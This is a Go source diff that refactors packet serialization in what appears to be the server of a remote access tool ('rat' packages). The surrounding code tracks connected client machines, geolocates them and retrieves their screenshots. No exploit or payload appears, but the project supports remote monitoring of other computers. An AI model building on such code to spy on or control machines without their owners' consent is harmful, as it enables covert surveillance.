@@ -4,10 +4,10 @@ import (
 	"encoding/base64"
 	"encoding/binary"
 	"fmt"
-	"io"
 	"math/rand"
 	"net"
 	"rat/common"
+	"rat/network"
 	"strconv"
 	"strings"
 	"time"
@@ -24,9 +24,10 @@ type Monitor struct {
 }
 
 type Client struct {
-	net.Conn
-	common.Writer
-	common.Reader
+	network.Writer
+	network.Reader
+
+	Conn net.Conn
 
 	Id int
 
@@ -63,6 +64,8 @@ func NewClient(conn net.Conn) *Client {
 	client.Id = int(rand.Int31())
 	client.Computer = common.Computer{}
 	client.Conn = conn
+	client.Reader = network.Reader{conn}
+	client.Writer = network.Writer{conn}
 	client.Country, client.CountryCode = GetCountry(client.GetIP())
 	client.Listeners = make(map[common.PacketHeader]*websocket.Conn)
 	client.Monitors = make([]Monitor, 0)
@@ -131,19 +134,20 @@ func (client *Client) PacketReader() {
 		}
 
 		packet := GetIncomingPacket(header)
-		err = packet.Read(client)
-
+		e, err := network.Deserialize(client.Reader, packet)
 		if err != nil {
 			fmt.Println(err.Error())
 			remove(client)
 			break
 		}
+
+		e.(IncomingPacket).OnReceive(client)
 	}
 }
 
 func (client *Client) Heartbeat() {
 	for {
-		client.Queue <- Ping{}
+		client.Queue <- &Ping{}
 
 		for !client.Ping.Received {
 			time.Sleep(time.Millisecond)
@@ -160,91 +164,9 @@ func (client *Client) PacketQueue() {
 	}
 }
 
-func (c *Client) WriteInt(i int) error {
-	i32 := int32(i)
-	return binary.Write(c, common.ByteOrder, &i32)
-}
-
-func (c *Client) WriteInt64(i int64) error {
-	return binary.Write(c, common.ByteOrder, &i)
-}
-
-func (c *Client) WriteFloat(f float32) error {
-	return binary.Write(c, common.ByteOrder, &f)
-}
-
-func (c *Client) WriteBool(b bool) error {
-	var byt byte
-
-	switch b {
-	case true:
-		byt = 1
-	default:
-		byt = 0
-	}
-	data := make([]byte, 1)
-	data[0] = byt
-
-	_, err := c.Write(data)
-
-	return err
-}
-
-func (c *Client) WriteString(s string) error {
-	err := c.WriteInt(len(s))
-
-	if err != nil {
-		return err
-	}
-
-	c.Conn.Write([]byte(s))
-	return err
-}
-
-func (c *Client) ReadString() (string, error) {
-	n, err := c.ReadInt()
-
-	if err != nil {
-		fmt.Println(err.Error())
-		return "", err
-	}
-
-	buf := make([]byte, n)
-	io.ReadFull(c, buf)
-
-	s := string(buf)
-
-	return s, err
-}
-
-func (c *Client) ReadInt() (int, error) {
-	var n int32
-	err := binary.Read(c, common.ByteOrder, &n)
-
-	return int(n), err
-}
-
-func (c *Client) ReadInt64() (int64, error) {
-	var n int64
-	err := binary.Read(c, common.ByteOrder, &n)
-	return n, err
-}
-
-func (c *Client) ReadFloat() (float32, error) {
-	var f float32
-	err := binary.Read(c, common.ByteOrder, &f)
-	return f, err
-}
-
-func (c *Client) ReadBool() (bool, error) {
-	b := make([]byte, 1)
-	_, err := c.Read(b)
-	return b[0] == 1, err
-}
-
 func (c *Client) ReadHeader() (common.PacketHeader, error) {
 	var h common.PacketHeader
-	err := binary.Read(c, common.ByteOrder, &h)
+	err := binary.Read(c.Conn, common.ByteOrder, &h)
 
 	return h, err
 }
@@ -254,13 +176,15 @@ func (c *Client) WriteHeader(header common.PacketHeader) error {
 }
 
 func (c *Client) WritePacket(packet OutgoingPacket) error {
-	err := c.WriteHeader(packet.GetHeader())
+	err := c.WriteHeader(packet.Header())
 
 	if err != nil {
 		return err
 	}
 
-	return packet.Write(c)
+	packet.Init(c)
+
+	return c.Writer.WritePacket(packet)
 }
 
 // GetEncodedScreen returns a base64 encoded version of the most recent screenshot
